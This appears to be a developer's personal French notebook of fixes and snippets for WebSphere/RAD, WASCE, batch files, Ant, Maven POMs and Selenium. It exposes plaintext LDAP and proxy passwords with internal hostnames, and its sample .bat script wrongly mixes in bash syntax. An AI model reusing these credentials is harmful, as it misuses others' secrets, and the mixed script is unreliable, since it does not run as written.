		Il n'y a rien a faire sur le projet buggue: c'est impossible a corriger: le problème n'est pas dans les web.xml ni dans autres fichiers .projet ou ibm ou settings. Il faut donc refaire un nouveau projet vierge et prendre les sources du projet foutu et les mettre dans le projet vierge. Et la ca marche!!!!
si sur was 6 j'ai ce message d'erreur: 
			Caused by: java.lang.Exception: Attempted to use a 5.0 DataSource outside of a 2.3 servlet
					il faut que je migre en 2.3
			Caused by: javax.naming.NamingException: Attempted to use a 4.0 DataSource from a 2.3 (or higher) servlet. Invalid configuration.
						C'est parce que dans la console d'administration la database est declaree comme version 4. Il faut passer en version 5 par ex.
voir ma doc de RAD7:Z:\MyDocs\RS3minute\rapports\Installation_Applications_FWS_Avec_RAD_7_e1.a.V1.1.doc
pour importer un projet web de subversion: svn > checkout as webprojetdynamique (le siaWeb)(selectionner java, struts etc comme modules) > checkout application d'entreprise. click droit sur projet web > profiler... Client d'application Websphere (choisir l'application d'entreprise contenant donc le projet web)
Si on a cette erreur: ServletException in '/jsp/i18n/cm/I18NListTop.jsp': null (...)
si le fichier struts-config.xml ne s'affiche pas bien avec l'editeur: le copier sous web-inf et essayer de l'ouvrir à  ce niveau. Si ca ne marche toujours pas il faut faire une modif soit dans les fichiers .classpath soit .??? je ne sais pas
si erreur CREATE_LISTENER_FAILED_4 lors du demarrage du serveur: existance d'un conflit de port: arreter tous les autres serveurs
pour creer un autre profil de serveur: fenetre> preferences>serveur>websphere > profils websphere>Creer...
Quand on lance un serveur, si il y a le message: SRVE0238E : il manque un slash (Une barre oblique doit ?tre plac?e au d?but des chemins de ressources)
faire ca: 			<param-value>WEB-INF/classes/struts-config.xml</param-value> ---> 			<param-value>/WEB-INF/classes/struts-config.xml</param-value>
ou faire ca: 
As WebSphere version 5.0 allowed URLs without leading front slashes ( / ), to preserve compatibility, a custom property needs to be set at the Web Container. The prependSlashToResource property ignores the specification and considers URLs without the leading front slash. 
To set the custom property, use the administrative console, and go to Servers d'application > (nom de mon serveur) > WebContainer > Additional Properties >propriete personelles> New property.
Name: prependSlashToResource
value: true
relancer le serveur et la ca marche 
Si j'ai une exception lors du lancement du serveur de type : classnotfoundexception ActionServlet de struts c'est que j'ai mal defini les bibliotheques de mon projet: revoir l'ordre de chargement des bibliotheques: mettre bibliotheque d'application web en deuxieme et non pas en dernier
  Ca peut etre aussi du au fait que dans application.xml onglet deployement je charge que les classes du module et non pas celles de l'application
pour qu'il n'y ait pas de pb avec j_security_check: dans console d'administration decocher "Securite java2" puis choisir RegistreLDAPAUtonome > Configurer... > Nom de l'utilisateur administratif primaire : AWTWSAD > cocher Identite de serveur stockee dans un referentiel : user AWTWSAD PASS AWTWSAD > type de serveur LDAP: sunONE, hote: anndev.mc2.renault.fr , nom distinctif de base: o=renault, nom distinctif de liaison: uid=AWTWSAD,ou=FRA,ou=People, o=renault; mot de passe de liaison: AWTWSAD bien cliquer quand c'est fini sur le bouton "definir comme actif" et Sauvegarder. Activer la securite sur cette application.
Si j'ai des erreurs de type java.io.FilePermission D:\workspaceRAD7\mapWeb\WebContent\WEB-INF\web.xml read c'est que soit il y a deja un serveur lance: arreter tout, soit les fichiers sont en Lecture seule: avec explorateur enlever cette option
cette erreur ci dessus peut aussi entrainer : pas d'image ni de Javascript charge sur la page
Si application.xml ne s'affiche pas correctement faire: selectionner l'application d'entreprise > propriete > xdoclet > version 1.2.3
ou mieux(NON!): se mettre perspective web, vue explorateur de projets clic droit sur descripteur de deployement> migrer
ou encore mieux: click droit sur projet d'application d'entreprise, > proprietes > valeur de projet > ajouter websphere application (coexistence) et websphere application (etendu)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE application PUBLIC "-//Sun Microsystems, Inc.//DTD J2EE Application 1.3//EN" "http://java.sun.com/dtd/application_1_3.dtd">
<application id="Application_ID">
par ca:
<?xml version="1.0" encoding="UTF-8"?>
<application id="Application_ID" version="1.4" xmlns="http://java.sun.com/xml/ns/j2ee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/application_1_4.xsd">


WASCE :
		difference entre local et environnement de dev:
			1) Dans siaWeb/WebContent/geronimo-web.xml :
			En local :
			<nam:resource-ref>
			    <nam:ref-name>jdbc/Datasource</nam:ref-name>
			    <nam:resource-link>siaDatasource</nam:resource-link>
			  </nam:resource-ref>
			  <security-realm-name>ARCA</security-realm-name>
			En dev :
			<nam:resource-ref>
			    <nam:ref-name>jdbc/Datasource</nam:ref-name>
			    <nam:resource-link>sia/jdbc/Datasource</nam:resource-link>
			  </nam:resource-ref>
			  <security-realm-name>arca</security-realm-name> 
			2) earcontent ne doit pas être sous SVN mais META-INF oui.
------------------
scripts .bat :
    ATTENTION pour les variables 
          Generations of batch file programmers have tripped over this one. Here it goes.
          When the command processor interprets a batch file, it does it like this:
          - Read a line of code.
          - Perform whatever variable substitution is necessary.
          - Execute it.
          - Read the next line of code.
          - etc.
          And here comes the catch: When you use parenthesis in your code then everything within the parenthesis counts as one single line 
exemple de script .bat LINKDevopslksjqgfvmlka
@echo off
@echo off
Set M3="C:\Program Files\JetBrains\IntelliJ IDEA Community Edition 2018.2.3\plugins\maven\lib\maven3\bin"
Set "JAVA_HOME=C:\Program Files\Java\jdk1.8.0_181\jre"
  set /P version=Version ?
  echo %version%
rem ljsdflsdkjf// commentaire
Set M3="C:\Program Files\JetBrains\IntelliJ IDEA Community Edition 2018.2.3\plugins\maven\lib\maven3\bin" (ne me demande pas pourquoi pour les guillemets!! c pas pareil que la ligne en dessous. Mais ça marche)
Set "JAVA_HOME=C:\Program Files\Java\jdk1.8.0_181\jre"
echo %M3%
echo %JAVA_HOME%
%M3%\mvn versions:set
pause
echo PAE INT > actuel.txt
set /P continue=Commit pulled and tested OK ? Y N   // prompt qui dit "Commit pulled and tested OK ? Y N" et set dans la variable continue le resultat 
if %continue%==Y (              // if commence: parenthese = accolades
                                if avec parenthese est traite en un seul bloc sans s'interrompre donc si on veut que les varaiables soient raffraichies : fire le if sur une seule ligne if..... goto xxxx et le flag goto c'est ":xxxx    "
set /P version=Version ?
%M3%\mvn versions:set
echo %version%
%M3%\mvn clean
%M3%\mvn compile
%M3%\mvn package
if [[ "$?" -ne 0 ]] ; then // $? c'est le code que renvoit le programme precedent dernier code. -ne c'est pour "not equal" donc ici si code retour different de zero alors... si maven echoue rate ko les tests interruption de la livraison devops 
  echo 'could not perform tests'; exit $rc      // quitte le programme. exit $rc
fi
git add src
git add pom.xml
git add *.zip
rem git commit -m "Automatic delivery of %version%"
Set WEB-INF-PAE=D:\workspace\paeWeb\WebContent\WEB-INF
echo ren %WEB-INF-PAE%\ibm-web-ext.xmi
ren %WEB-INF-PAE%\ibm-web-ext.xmi dev_ibm-web-ext.xmi // pour renommer rename
ren %WEB-INF-PAE%\_integr.ibm-web-ext.xmi ibm-web-ext.xmi
echo ren %WEB-INF-PAE%\web.xml
ren %WEB-INF-PAE%\web.xml dev_web.xml
ren %WEB-INF-PAE%\_integr.web.xml web.xml
echo ren %WEB-INF-PAE%\classes\log4j.properties.template
ren %WEB-INF-PAE%\classes\log4j.properties.template _dev.log4j.properties.template
ren %WEB-INF-PAE%\classes\_integr.log4j.properties.template log4j.properties.template
) else (echo "exit")

------------------

ant : avec maven : pour par exemple renommer un fichier apres coup 
    utiliser maven avec ant :
        dans le pom:  
          <plugin>
                      <groupId>org.apache.maven.plugins</groupId>
                      <artifactId>maven-antrun-plugin</artifactId>
                      <version>1.8</version>
                      <executions>
                          <execution>
                              <id>compile</id>
                              <phase>compile</phase>
                              <configuration>
                                  <target>
                                      <ant antfile="${project.basedir}/antbuild.xml" target="clean"> // target va pointer vers LINKantslkjsdf
                                          <property name="version" value="${project.version}"/> // du coup je vais pouvoir utiliser ${version} dans le script antbuild.xml
                                      </ant>
                                  </target>
                              </configuration>
                              <goals>
                                  <goal>run</goal>
                              </goals>
                          </execution>
                      </executions>
                  </plugin>
        script antbuild.xml:
            <project>
    <target name="clean"> // c'est le nom LINKantslkjsdf
        <delete file="../../batchs/memoclap.copyproject-${version}.jar"/>
        <delete file="../../batchs/memoclap.filter-${version}.jar"/>
        <delete file="../../batchs/memoclap.parser-${version}.jar"/>
    </target>
        <target name="renameServiceWorkerFile"> //deplacer renommer un fichier avec ant et maven
          <move todir="../../" includeemptydirs="false">
              <fileset dir="../../"/>
              <mapper type="glob" from="service-worker-v*.js" to="service-worker-v${version}.js"/>
          </move>
    </target>
    </project>
doc utile sur :
          http://ant.apache.org/manual/
si j'ai le message : Reference xxxxxxxx classpath not found:
        il faut savoir que quand j'ai classpathref=xxx ou <classpath refid="xxx
        xxx est defini en haut par: 
          <path id="project.class.path">(...)</> qui contient tout mes jars.
Pour executer sur eclipse: la definition du classpath se fait comme ca :
         definir le ANTHOME dans onglet Chemin d'acces aux classes: ANT_HOME
si j'ai le message: 
BUILD FAILED: file:C:/java/eclipse/workspace/common/build.xml:59: Cannot use classic compiler, as it is not available.  A common solution is to set the environment variable JAVA_HOME to your jdk directory.
      alors rajouter dans le ant ceci: 
	           <property name="build.compiler" value="org.eclipse.jdt.core.JDTCompilerAdapter"/> (en tête de fichier dans la balise <project>
le script de francois pour generer l'ear d'une appli : 
      \\F-horus\shared\P-odp\odp\RS3_Minute\_Partage_Transversal\Projets\ANT_Delivery_2.0.0\antDelivery210.cmd
		      et l'executer. Si ca ne marche pas c'est peut etre parce que ANT_HOME est defini dans les variables d'environnement: supprimer ANT_HOME
	             Remonter les bugs antdelivery 2.0.0 sur https://collaboration.renault.com/eRoom/FAC_KORP1_10/RS3Minute/0_95231
build.xml does not exist alors :
        ouvrir une fenetre cmd et faire ca: 
              FAIRE:
              voir ii*ii
              set ANT_HOME=K:\apache-ant-1.6.5
              set CLASSPATH=K:\apache-ant-1.6.5
              set Path=K:\apache-ant-1.6.5\bin
              K:
              puis lancer ant:
              cd apache-ant-1.6.5/bin
              ant -buildfile ..\build\Build210.xml
              quand c'est fini il met l'ear sous : C:\Documents and Settings\Administrator\Local Settings\Temp\build\delivery
              ou C:\Documents and Settings\p036782\Local Settings\Temp\delivery
              pour deployer en DEV autant de fois qu'on veut numero de build à  mettre 0
              pour deployer pour l'Integration, la recette ou l'oper mettre build -1
              Quand le chef de projet dit OK: deployer en INTEGR  build à  mettre 1 puis faire une fiche OSL
              pour ca: creer une nouvelle branche v_1_2_0 comme ca: copier trunk vers branche...v_1_2_0 > lancer le script de francois en mettant rien ou build 1?
              remplir version labell avec TD:00000 ras EVOL:0 bla CH:0 bla



SELENIUM :(mettre les -D avant le -jar) (pour les tests d'integration: utilisation de failsafe) Autre solution : Katalon Recorder
"%JAVA_HOME%\bin\java" -Dhttp.proxyHost=172.26.80.141 -Dhttp.proxyPort=3128 -Dhttp.proxyUser=p036782 -Dhttp.proxyPassword=rcwkdr2 -jar selenium-server.jar -interactive -multiWindow
"%JAVA_HOME%\bin\java" -jar selenium-server.jar -interactive -multiWindow
	cmd=getNewBrowserSession&1=*iexplore&2=http://su423ads.mc2.renault.fr:12051/doa/
	cmd=getNewBrowserSession&1=*firefox&2=http://su423ads.mc2.renault.fr:12051/doa/
cmd=open&1=http://su423ads.mc2.renault.fr:12051/doa/index.jsp/webhp&sessionId=691579
cmd=testComplete&sessionId=936055 Pour arreter
cmd=open&1=http://www.google.com/webhp&sessionId=162675
 Driver: possible utiliser headless browser qui n'ouvrent pas de fenetre: plus rapide. Such as PhantomJS, HtmlUnitDriver
 Pas possible de lancer test selenium en java sur une fenettre deja ouverte
          package tests;
              import org.openqa.selenium.By;
              import org.openqa.selenium.WebDriver;
              import org.openqa.selenium.WebElement;
              import org.openqa.selenium.chrome.ChromeDriver;
              public class Test {
                  private WebDriver driver;
                  @org.junit.Test
                  public void doit() {
                      System.setProperty("webdriver.chrome.driver", "E:/Mesdocuments/Installations/chromedriver.exe");
                      driver = new ChromeDriver();// ne pas utiliser phantomjs car chrome et firefox peuvent faire pareil
                      driver.get("https://app.mailjet.com/signin");
                      //WebDriver driver = new FirefoxDriver();
                      WebElement elementdom = driver.findElement(By.id("login"));
                      elementdom.sendKeys("xxxxxxxxxx");
                      elementdom = driver.findElement(By.id("password"));
                      elementdom.sendKeys("xxxxxxxxxxxxxxx");
                      driver.findElements(By.name("submit")).get(0).click(); //cliquer
                      driver.get("https://app.mailjet.com/campaigns");
                      driver.findElement(By.xpath("//*[@id=\"li9Lh\"]/td[10]/span")).click();
                      driver.findElement(By.xpath("//*[@id=\"li9Lh\"]/td[10]/span/ul/li[3]/a/span")).click();
              
                      iterate("Mag1", 7);
                      iterate("Mag2", 8);
                      iterate("Magbio", 15);
                  }
              
                  public void iterate(String dest, int index) {
                      WebElement elementdom = driver.findElement(By.xpath("//*[@id=\"title\"]"));
                      String title = elementdom.getAttribute("value");
                      String[] titlesplit = title.split(" ");
                      String newtitle = titlesplit[0] + " " + titlesplit[1] + " " + titlesplit[2] + " " + dest;
                      elementdom.clear();
                      elementdom.sendKeys(newtitle);
                      elementdom = driver.findElements(By.className("MJT-Select-arrow")).get(0);
                      elementdom.click();
                      elementdom = driver.findElements(By.className("MJT-Select-option-label")).get(index);
                      elementdom.click();
                      elementdom = driver.findElement(By.xpath("//*[@id=\"save-campaign-step1\"]"));
                      elementdom.click();
                      elementdom = driver.findElement(By.xpath("//*[@id=\"nl_menu\"]/div[1]/div[2]/p[2]/a[3]"));
                      elementdom.click();
                      System.out.println("stop");
                      //driver.findElement(By.cssSelector("#cheese #cheddar"));
                  }
              }

MAVEN : attention: artifactid ne doit pas contenir des points
  pour verifier la securite des dependances voir LINKfkjOwasplkjsg
  connaitre la version maven et afficher des infos details maven home path:
    mvn -v
si j'ai l'erreur [ERROR] Failed to execute goal org.apache.maven.plugins:maven-enforcer-plugin:1.4.1:enforce (enforce) on project com.soprahr.hub.bc.usermgt.service: Some Enforcer rules have failed. Look above for specific messages explaining why the rule failed. -> [Help 1]
    regarder les warnings au dessus
si erreur The packaging for this project did not assign a file to the build artifact
    il faut pas faire mvn:install:install mais mvn install car install:install est un goal d'un plugin install    
si un plugin n'est pas exectute peut etre c parce que dans le pom les pluggins sont entoures par pluginManagement. Virer ces balises
possible d'overrider dans le pom lurl du repository : AH... n'a pas l'air de prendre le pas sur ce qui est def dans le settings.xml parametre dans eclipse>preferences>maven
  dans pom.xml:
    <project...blabla..>.... 
    	<repositories>
		<repository>
			<id>sopra hr releases</id>
			<url>http://hra-nexus.ptx.fr.sopra/content/repositories/soprahr-releases/</url>
			ou
      <url>https://maven.java.net/content/repositories/public/</url>
		</repository>
	</repositories>	
 dans settings.xml :
  <servers>
    <server><id="xxx">
      user et mot de passe pour ce connecter à ce repository xxxx
      </server>
  </servers>
  ...
     <mirrors>
      <mirror>
       			<id>xxx</id>
       			<mirrorOf>*</mirrorOf> si * ce repository va essayer de resoudre tous les artifacts: donc un seul repo pour tous!.
       			<url>https://url d'un repository</url>         (dans https://mvnrepository.com quand on cherche une librairie, pour connaitre l'url du repository ou elle est, chercher "Note: this artifact it located at...")
       		</mirror>
       		..plusieurs mirrors possible // mais en fait jamais reussi a comprendre et a faire marcher l'utilisation de plusieurs repository repositories avec mirrors: utiliser plutot dans settings les profiles
      </mirrors>                                             comme ca dans settings.xml (activer le profil all lors de l'execution)
                                                                <profile>
                                                                <id>all</id>
                                                                <activation>
                                                                  <jdk>all</jdk>
                                                                </activation>
                                                                <repositories>
                                                                  <repository>
                                                                    <id>1</id>
                                                                    <name>1</name>
                                                                        <url>https://repo.maven.apache.org/maven2/</url>
                                                                  </repository>
                                                                  <repository>
                                                                    <id>2</id>
                                                                    <name>2</name>
                                                                      <url>http://repository.jspresso.org/maven2/</url>
                                                                  </repository>
                                                                </repositories>
                                                              </profile>
      
si le repository maven n'a pas l'air de se raffraichir recharger jar missing artifact "Failure to transfer org.apache.maven.plugins:maven-surefire-plugin:pom:2.18.1 from http://hra-nexus.ptx.fr.sopra/content/groups/all-repositories was cached in the local repository, resolution will not be reattempted until the update interval of nexus has elapsed or  s are forced. Original error: Could not transfer artifact"
    c'est possible que le pom.xml de cet artifact ne soit pas là donc:
    supprimer dans le repository local le fichier correspondant lastUpdated reexecuter maven (click droit projet>Maven>update)
si erreur Deployment failed: repository element was not specified in the POM inside distributionManagement
    c parce que je fais deploy et je n'ai pas defini de repository pour deployer sur repository
si erreur Erreur: impossible de trouver ou charger la classe principale org.codehaus.classworlds.Launcher
   renommer la variable d'environnement M2_HOME en M3_HOME... NON! en fait pointer vers ../apache marche pas. il faut pointer vers .../apache/bin et l'appeler comme ci-dessous 
pour savoir ou est mon settings.xml 
      %M3%/mvn -X help:effective-settings puis regarder en haut
      pour forcer l'utilisation d'un settings particulier
      mvn --settings D:/Dev/apache-maven-2.2.1/conf/settingsSOPRACopie.xml etc...
si sous eclipse j'ai l'erreur "Could not read settings.xml"
  dans windows>preference > Maven > installations globalsettings vider le champs.
mavenizer un projet sous eclipse:  
  click droit projet>configure > converttomavenproject
    le repository de maven: http://search.maven.org/#search%7Cgav%7C1%7Cg%3A%22xerces%22%20AND%20a%3A%22xercesImpl%22
si j'ai l'erreur “Dynamic Web Module 3.0 requires Java 1.6 or newer” in Maven Projects
    parametres du projets s'assurer que projects facet, compiler et librairie sont tous java1.7
    dans le pom mettre: 
                              <build>
                                  <plugins>
                                      <plugin>
                                      <groupId>org.apache.maven.plugins</groupId>
                                      <artifactId>maven-compiler-plugin</artifactId>
                                      <version>3.1</version>
                                      <configuration>
                                          <source>1.7</source>
                                          <target>1.7</target>
                                      </configuration>
                                  </plugin>
                                  </plugins>
                              </build>
                              si message javac: invalid target release: 1.7 executer Run avec la bonne version 1.7 java
    et refaire un update maven sous eclipse ii*ii
dans eclipse quand on fait update projects configuration il met à jour les librairies du projet et mets java compiler 1.5 par defaut. Si on veut changer de compiler mettre:
          <plugin>
          <groupId>org.apache.maven.plugins</groupId>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>2.1</version> ou <version>${parent.version}</version>
          <configuration>  
            <source>1.6</source> // pour forcer le build maven avec la bonne version java
            <target>1.6</target>
          </configuration>
        </plugin>
exemple de pom racine
  <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<groupId>web.audioloop</groupId>
	<artifactId>AudioLoop</artifactId> <!-- le nom de mon war ou jar au final. 
  <finalName>transport</finalName> à mettre dans <build> sera le nom de l'application war c a d que lURL devra contenir ce nom (je crois)
	
  	<packaging>pom ou jar ou war ou karaf-assembly selon</packaging>
	<name>AudioLoop</name> // utilisé dans intellij dans le paneau maven pour : name est affiché là
	<version>1.0.0</version>
	
	// si il a un parent:
	 <parent>
    <groupId>net.nanthrax.examples</groupId>
    <artifactId>jaxrs-blueprint</artifactId>
    <version>1.0-SNAPSHOT</version> // snapshot indique des versions en cours de dev. Possible de deployer même versions contenant code different: le dernier dans le temps sera pris en compte par maven 
    <relativePath>../pom.xml</relativePath>
  </parent>
	
	<properties>
	    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding> Linkmvnprop
  	</properties>
    ou
    <properties>
                <zip.name>parametre peut etre sette en ligne de commande: -Dzip.name</zip.name>
    <properties>
  		<profiles> 
			<profile>
      <id>env-dev</id>
      <activation>
      <activeByDefault>true</activeByDefault> // facultatif pour qu'il soit active par defaut Linkmvnprop
        <property>
          <name>env</name> Linkmvnprop
          <value>dev</value>
        </property>
      </activation>
      <properties>
          <dbusr>root</dbusr> Linkmvnprop ainsi partout ailleur si on met ${dbusr} la valeur est remplacee si LINK**$** c'est un system properties qui est sette
          <dbpass>root</dbpass>
          <dburl>jdbc:mysql://localhost:3306/ideaenterprise1</dburl>
       </properties>
                        ICI dans le profile on peut mettre une balises <build><plugins><plugin>....</plugin></plugins></build> pour executer des plugins conditionnellement en fonction des profils Linkmvnprop
    </profile>
		<profile>
      <id>env-production</id>               
      <activation>
        <property>
          <name>env</name> Linkmvnprop
          <value>prod</value>
            </property>
          </activation>
          <properties>
              <dbusr>root</dbusr> Linkmvnprop
              <dbpass>root</dbpass>
              <dburl>jdbc:mysql://localhost:3306/ideaenterprise1</dburl>
       </properties>
	</profile>
  </profiles>
	<build>
		<plugins>
	     <plugin>
       ...
       </plugin>
      <plugin>
        ...
      </plugin>
       <!-- pour faire un jar avec les librairies et le manifestnecessaires grace a maven--> voir LINK5*55*5
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-jar-plugin</artifactId>
                <version>2.4</version>
                <configuration>
                <!--  <log4jConfiguration>${basedir}/log4j.properties</log4jConfiguration> 
                      <finalName>ReadMails</finalName> -->
                    1AUTOMATIQUE
                    <archive>
                        <index>true</index>  // facultatif: je ne sais pas a quoi il sert
                        <manifest> <!-- il genere le manifest -->
                            <addClasspath>true</addClasspath>
                            <classpathPrefix>./lib/ ./autre/path/</classpathPrefix> // facultatif. chemin relatif exterieur vers les libs. on peut aussi mettre chemin absolu On ne peut pas inclure des jars dans un jar. On ne peut pas mettre de wildcard dans un manifest  
                            <mainClass>audioLoopOnline.mailReader.MailsReader</mainClass>
                        </manifest>
                    </archive>
                    2OU BIEN <!--si je veux qu'il recup un manifest quelquepart sur le disque: --> (hors de archive)
         					    <useDefaultManifestFile>true</useDefaultManifestFile> // dans le manifest que j'ecris dans
               				<defaultManifestFile>MANIFEST.MF(a la racine du projet)</defaultManifestFile>
               				ou
                    <defaultManifestFile>D:/LocalData/p036782/workspaceDDD/Exporter/MANIFESTPROD/MANIFEST.MF</defaultManifestFile>
                </configuration>
            </plugin>
      <plugin>
                    
          
    </plugins>
	</build>
	<modules>
		<!-- <module>../tmt_Enterprise</module>
		<module>../tmt_Application</module> //artifactid du pom.xml du repertoire au meme niveau je crois
		<module>../tmt_Client</module>        -->
		<module>sivox</module>              //artifactid du pom.xml du sous repertoire 
		<module>AudioLoopOnlineReadMails</module>
		<module>AudioMixer</module>
		<module>Idea-web</module>
  	<module>Idea-jar</module>
  	<module>Idea-tools</module>
	</modules>
      	<dependencies>
                      <dependency>
                  <groupId>junit</groupId>
                  <artifactId>junit</artifactId>
                  <version>4.7</version> ou <version>${project.version}</version>
                  <scope>test</scope>
              </dependency>
              </dependencies>
  </project>
                pluggin pour qu'il ajoute les dependances jars les librairies dans un repertoire du target
                <plugin>
                      <groupId>org.apache.maven.plugins</groupId>
                      <artifactId>maven-dependency-plugin</artifactId>
                      <executions>
                          <execution>
                              <id>copy-dependencies</id> ou <id>unpack</id>
                              <phase>package</phase> ou <phase>compile</phase> ou <phase>generate-resources</phase>// si j'ai l'erreur maven-dependency-plugin (goals “copy-dependencies”, “unpack”) is not supported by m2e JE peux l'ignorer il arrive qd meme à executer les commandes maven pour builder
                              <goals>
                                  <goal>copy-dependencies</goal> ou <goal>unpack-dependencies</goal>(cool! dezippe aussi les jars des dependances transitives) ou <goal>unpack</goal>(pas top car oblige a copier definir a la main les dependances dans ce plugin et en plus je crois que dans ce cas il ne gere pas les dependencies donc mieux vaut utiliser unpack-dependencies)
                              </goals>
                              <configuration>
                                  <outputDirectory>${project.build.directory}/lib</outputDirectory>
                                  <overWriteReleases>false</overWriteReleases>
                                  <overWriteSnapshots>false</overWriteSnapshots>
                                  <overWriteIfNewer>true</overWriteIfNewer>
                              </configuration>
                          </execution>
                      </executions>
                  </plugin>          
                 <plugin>
                     <groupId>org.apache.maven.plugins</groupId>
                    <artifactId>maven-resources-plugin</artifactId> // pour copier à partir de la base du projet qqchose (fichier de configuration, properties proprietes) vers un autre repertoire qui peut etre le classpath ou meme un repertoire du serveur embedded execute par maven. Ou bien LINK_ààà"çç". ne pas confondre avec <groupId>org.codehaus.mojo</groupId><artifactId>build-helper-maven-plugin</artifactId> qui sert à déposer de la conf dans le repository maven
                    <version>3.1.0</version>                           // je crois que par defaut copie /src/main/resource/* dans target/classes/*
                          <executions>
                             <execution>
                              <id>copy libraries</id> // le nom que je veux de mon execution. Exemple ici je copie des librairies qqpart
                              <!-- here the phase you need -->
                              <phase>validate</phase>
                              <goals>
                                <goal>copy-resources</goal>
                              </goals>
                              <!-- si il ne compile pas mon code java , peut etre besoin mettre ca  NON ne pas mettre ca. Ca ne marchait pas parce que en tête de mon pom j'avais mis <packaging pom au lieu de packaging jar 
                              <executions>
                                        <execution>
                                          <phase>package</phase>
                                          <goals>
                                            <goal>jar</goal>
                                          </goals>
                                          </execution>
                              </executions>
                              FIN si il ne compile pas mon code java , peut etre besoin mettre ca-->
                              <configuration>
                                  <outputDirectory>${basedir}/../../batchs/lib</outputDirectory>
                                  ou 
                                  <outputDirectory>${basedir}/target/tomcat/conf/mdl</outputDirectory> // si c'est un tomcat embedded et que dans une config de spring je mets : <context:property-placeholder location="file:///${catalina.base}/conf/mdl/import_excel.properties" /> 
                                  <resources>          
                                    <resource>  // ou bien LINK_ààà"çç"
                                      <directory>${basedir}/src/main/resources</directory>
                                      <filtering>false</filtering>
                                      <includes>
                                          <include>*.jar</include> // ne marche que pour les fichiers par pour les directories repertoires
                                          <include>*.properties</include>...
                                      </includes>            
                                    </resource>
                                </resources>              
                              </configuration>            
                            </execution>
                            <execution>
                              <id>copy-generated-jars</id>
                              <!-- here the phase you need -->
                              <phase>install</phase>
                              <goals>
                                <goal>copy-resources</goal>
                              </goals>
                              <configuration>
                                <outputDirectory>${basedir}/../../batchs</outputDirectory>
                                <resources>          
                                  <resource>
                                    <directory>${basedir}/target</directory>
                                    <filtering>false</filtering>
                                    <includes>
                                        <include>*.jar</include>
                                  </includes>            
                                  </resource>
                                </resources>              
                              </configuration>            
                            </execution>
                          </executions>
                        </plugin>
pour faire un jar qui contient les sources java (attention j'ai pas trouve comment faire un jar avec les .class et les .java)
    <plugin>
			      <artifactId>maven-source-plugin</artifactId>
			      <version>2.2.1</version>
			   <!--    <configuration>
			         <useDefaultManifestFile>true</useDefaultManifestFile>
			      	<defaultManifestFile>${project.build.outputDirectory}/META-INF/MANIFEST.MF</defaultManifestFile>
					<includes>**/*.java</includes>
					<includePom>true</includePom>
			      </configuration> -->
			      <executions>
          <execution>
            <id>attach-sources</id>
            <phase>verify</phase> ou             <phase>package</phase>
            <goals>
              <goal>jar-no-fork</goal>
            </goals>
          </execution>
        </executions>
      </plugin>
pour creer un executable windows un .exe: (si plante c'est parce que mon .ico est corrompu ou que j'ai execute le plugin launch4j alors que je dois juste faire mvn package) 
      <plugin>
            <groupId>com.akathist.maven.plugins.launch4j</groupId>
            <artifactId>launch4j-maven-plugin</artifactId>
            <version>1.5.1</version>
            <executions>
                <execution>
                    <id>l4j-clui</id>
                    <phase>package</phase>
                    <goals>
                        <goal>launch4j</goal>
                    </goals>
                    <configuration>
                        <headerType>gui</headerType> // si l'executable ne demarre pas mettre <headerType>console</headerType> pour voir les logs quand execute .exe  
                        <jar>${project.build.directory}/${artifactId}-${version}.jar</jar>
                        <outfile>${project.build.directory}/statistik.exe</outfile>
                        <downloadUrl>http://java.com/download</downloadUrl>
                        <classPath>
                            <mainClass>chemin.vers.ma.MainClass</mainClass>
                            <addDependencies>true</addDependencies>
                            <preCp>anything</preCp>
                        </classPath>
                        <icon>src/main/resources/testClient.ico</icon>
                        <jre>
                            <minVersion>1.6.0</minVersion>
                            <jdkPreference>preferJre</jdkPreference>
                        </jre>
                        <versionInfo>
                            <fileVersion>1.0.0.0</fileVersion>
                            <txtFileVersion>${project.version}</txtFileVersion>
                            <fileDescription>${project.name}</fileDescription>
                            <copyright>2013 Renault.com</copyright>
                            <productVersion>1.0.0.0</productVersion>
                            <txtProductVersion>1.0.0.0</txtProductVersion>
                            <productName>${project.name}</productName>
                            <companyName>Renault.com</companyName>
                            <internalName>Renault</internalName>
                            <originalFilename>statistik.exe</originalFilename>
                        </versionInfo>
                    </configuration>
                </execution>
            </executions>
      </plugin>
utilisation du plugin assembly pour créer un zip : 
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-assembly-plugin</artifactId>
            <version>3.1.0</version>
                <executions>
                    <execution>
                        <id>make-assembly</id>
                        <phase>package</phase>
                        <goals>
                            <goal>single</goal>
                        </goals>
                          <configuration>
                            <descriptors>
                                <descriptor>
                                    ${project.basedir}/assembly.xml // va analyser ce fichier
                                </descriptor>
                            </descriptors>
                                <finalName>${zip.name}</finalName> // nom de mon zip au final (paramétré au début du fichier pom)
                                <appendAssemblyId>false</appendAssemblyId> // pour ne pas qu'il rajoute un id à la con Linksljfggg dans le nom de mon fichier zippé
                        </configuration>
                    </execution>
                </executions>
            </plugin>
            le fichier assembly.xml:
            <assembly xmlns="http://maven.apache.org/ASSEMBLY/2.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/ASSEMBLY/2.0.0 http://maven.apache.org/xsd/assembly-2.0.0.xsd">
                            <id>zip</id> // ce nom à la con Linksljfggg
                            <formats><format>zip</format></formats>
                            <includeBaseDirectory>false</includeBaseDirectory> // si a true il zip direct le parent qui est target ici.
                            <baseDirectory>target</baseDirectory>
                            <includeSiteDirectory>false</includeSiteDirectory>
                            <files>
                                <file>
                                    <source>${project.build.directory}/diversitysimulator_v${project.version}.exe</source>
                                    <outputDirectory>/data</ouputDirectory> // facultatif : pour mettre le fichier source dans le repertoire monZip/data/. Si on le met pas il met le fichier direct a la racine dans le zip quelquesoit son path
                                </file>
                                <file>
                                    <source>${project.build.directory}/Sprint1ExcelFormatsv0.04.xlsx</source>
                                    <outputDirectory>/system</ouputDirectory> // facultatif : pour mettre le fichier source dans le repertoire monZip/data/
                                </file>
                            </files>
                        </assembly>                                  
